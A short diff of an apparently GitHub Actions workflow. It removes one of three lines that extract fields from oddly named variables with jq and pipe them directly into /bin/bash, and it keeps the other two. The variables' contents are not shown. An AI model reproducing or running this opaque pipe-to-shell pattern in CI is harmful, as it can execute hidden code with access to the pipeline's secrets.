@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
           echo $elhqu82 | jq -r .sh2 | /bin/bash
-          printf '%s' "$scx6080" | jq -r .dl58182 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
